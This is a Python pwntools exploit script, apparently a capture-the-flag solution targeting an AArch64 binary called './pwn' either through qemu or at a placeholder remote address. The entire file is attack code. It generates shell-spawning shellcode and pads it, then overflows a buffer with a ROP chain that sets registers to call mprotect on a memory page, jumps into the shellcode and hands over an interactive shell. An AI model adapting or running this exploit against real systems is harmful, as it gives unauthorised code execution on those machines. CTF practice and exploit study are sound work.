from pwn import *
import sys
context.binary = "./pwn"
context.log_level = "debug"

if sys.argv[1] == "r":
    p = remote("remote_addr", remote_port)
elif sys.argv[1] == "l":
    p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu", "./pwn"])
else:
    p = process(["qemu-aarch64", "-g", "1234", "-L", "/usr/aarch64-linux-gnu", "./pwn"])

elf = ELF("./pwn")
libc = ELF("/usr/aarch64-linux-gnu/lib/libc.so.6")

shell_code = asm(shellcraft.sh())
shell_code = shell_code.ljust(0x100,'\x90')
shell_code = shell_code + p64(elf.plt['mprotect'])

payload = 'A' * 0x40 
payload += p64(0xdeadbeef)              # X19
payload += p64(0x4008CC)                # X20

payload += p64(0xdeadbeef)               # X29
payload += p64(0x4008AC)                 # X30
payload += p64(0) + p64(1)               # X19 , X20
payload += p64(0x411068 + 0x100)         # X21
payload += p64(0x7)                      # X22
payload += p64(0x1000)                   # X23
payload += p64(0x411000)                 # X24

payload += p64(0xdeadbeef)               # X29
payload += p64(0x411068)                 # X30
payload += p64(0) * 0x6                  # X19 - X24

p.recvuntil("Name:")
p.sendline(shell_code)
sleep(0.5)
p.sendline(payload)


p.interactive()